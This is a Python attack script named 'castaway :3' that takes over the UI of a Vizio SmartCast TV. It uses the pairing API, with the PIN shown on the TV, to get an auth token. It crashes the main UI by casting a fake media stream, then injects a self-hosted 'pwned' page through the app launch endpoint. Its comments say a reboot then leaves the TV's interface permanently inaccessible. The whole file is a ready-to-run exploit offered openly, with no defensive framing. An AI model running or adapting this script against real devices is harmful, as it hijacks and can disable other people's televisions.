#!/usr/bin/env python3

# castaway :3
# hijacks a vizio smartcast tv and bricks its ui if we want.
# we abuse the pairing api, get an auth token, and inject a message url 
# into the main ui process. 
#

#


import argparse
import json
import urllib3
import requests
import uuid
import threading
import http.server
import socketserver
import time
import sys
import socket
import os
import pychromecast

# sshhh... its self signed but thats fine
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# color codes for fancy logging 
C_CYAN = '\033[96m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_RED = '\033[91m'
C_RESET = '\033[0m'
C_BOLD = '\033[1m'

def log_info(msg):    print(f"{C_CYAN}[*]{C_RESET} {msg}")
def log_success(msg): print(f"{C_GREEN}[+]{C_RESET} {msg}")
def log_wait(msg):    print(f"{C_YELLOW}[?]{C_RESET} {msg}")
def log_error(msg):   print(f"{C_RED}[!]{C_RESET} {msg}")
def log_custom(msg):  print(f"{C_BOLD}{C_GREEN}{msg}{C_RESET}")

# write the pwned page to disk so the server can serve it
def create_payload_file():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>pwned :3</title>
        <style>
            body { 
                background-color: #000; color: #0f0; text-align: center; padding-top: 15%; 
                font-family: monospace; margin: 0; overflow: hidden; 
            }
            .corner-gif { 
                position: absolute; bottom: 10px; right: 10px; 
                width: 150px; height: auto; 
            }
        </style>
    </head>
    <body>
        <h1 style="font-size: 50px;">pwned :3</h1>
        <p style="font-size: 20px;">the tv is mine now.</p>
        <p style="color: #888;">(a reboot without restoring the original UI will result in the UI being inaccessible!)</p>
        <img src="image.gif" class="corner-gif" alt="victory">
    </body>
    </html>
    """
    with open("index.html", "w") as f:
        f.write(html)

def start_server(port):
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        httpd.serve_forever()

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def main():
    parser = argparse.ArgumentParser(description="castaway :3")
    parser.add_argument("--tv-ip", required=True, help="IP address of the Vizio TV")
    parser.add_argument("--port", type=int, default=8080, help="Local port to host the payload")
    args = parser.parse_args()

    
    if not os.path.exists("image.gif"):
        print("")
        log_wait("warning: no 'image.gif' found in this folder.")
        log_wait("the screen will just be green text. drop a gif in and re-run for maximum style.")
        print("")

    create_payload_file()

    target = f"https://{args.tv_ip}:7345"
    device_id = str(uuid.uuid4())
    local_ip = get_local_ip()
    
    # gens a cache buster so you can play with it
    cache_buster = uuid.uuid4().hex[:6]
    payload_url = f"http://{local_ip}:{args.port}/index.html?v={cache_buster}"

    # spin up the payload server
    server_thread = threading.Thread(target=start_server, args=(args.port,), daemon=True)
    server_thread.start()
    time.sleep(1) 

    print("")
    print(f"{C_BOLD}{C_GREEN}--- castaway :3 ---{C_RESET}")
    log_info(f"target: {target}")

    # lets make it pair
    log_info("poking the pairing endpoint...")
    pair_body = {"DEVICE_ID": device_id, "DEVICE_NAME": "castaway :3", "CHALLENGE_TYPE": 1}
    
    try:
        r = requests.put(f"{target}/pairing/start", json=pair_body, verify=False, timeout=5)
        pairing_token = r.json()["ITEM"]["PAIRING_REQ_TOKEN"]
        log_success(f"got token: {pairing_token}")
    except Exception as e:
        log_error(f"failed to start pairing: {e}")
        sys.exit(1)

    print("")
    log_wait("look at the tv. type the 4-digit pin. <<<")
    pin = input(f"{C_CYAN}  pin: {C_RESET}").strip()

    print("")
    log_info(f"sending pin {pin}...")
    finish_body = {"DEVICE_ID": device_id, "CHALLENGE_TYPE": 1, "RESPONSE_VALUE": pin, "PAIRING_REQ_TOKEN": pairing_token}
    
    try:
        r = requests.put(f"{target}/pairing/pair", json=finish_body, verify=False, timeout=5)
        auth_token = r.json()["ITEM"]["AUTH_TOKEN"]
        log_success("got the auth token.")
    except Exception as e:
        log_error(f"wrong pin? ({e})")
        sys.exit(1)

    headers = {"AUTH": auth_token, "Content-Type": "application/json"}
    exploit_url = f"{target}/app/launch?deviceId={device_id}"

    # the kill part
    print("")
    log_info("forcing the ui to release (via cast focus steal)...")
    try:
        casts, browser = pychromecast.get_chromecasts()
        cast = next((c for c in casts if c.cast_info.host == args.tv_ip), None)
        
        if cast:
            cast.wait()
            log_wait("launching default media receiver...")
            cast.start_app("CC1AD845")
            time.sleep(1)
            
            log_wait("forcing a dummy media load to steal focus...")
            # we cast a fake video stream to force the main UI to crash
            cast.media_controller.play_media("http://192.168.1.24:8080/dummy.mp4", "video/mp4")
            
            log_wait("waiting for main ui to die...")
            time.sleep(2.5) 
        else:
            log_error("couldn't find TV via pychromecast. the kill switch might fail.")
    except Exception as e:
        log_error(f"kill switch failed: {e}")

    # hijack!!! hijack it!!
    print("")
    log_info("hijacking the ui...")
    log_info(f"payload: {payload_url}")
    
    exploit_body = {"TYPE": "T_APP_V1", "VALUE": {"MESSAGE": payload_url, "APP_ID": "1", "NAME_SPACE": 4}}
    
    # hit it a few times to make sure it sticks
    for i in range(5):
        try:
            requests.post(exploit_url, headers=headers, json=exploit_body, verify=False, timeout=2)
        except Exception:
            pass
        time.sleep(0.2)

    print("")
    log_custom("pwned :3")
    log_success("if the screen turns green, we're in.")
    log_error("rebooting the tv now will make its ui permanently inaccessible.")
    print("")
    log_info("holding the server open for 60 seconds...")
    
    try:
        time.sleep(60)
    except KeyboardInterrupt:
        pass
    
    print("")
    log_info("done.")

if __name__ == "__main__":
    main()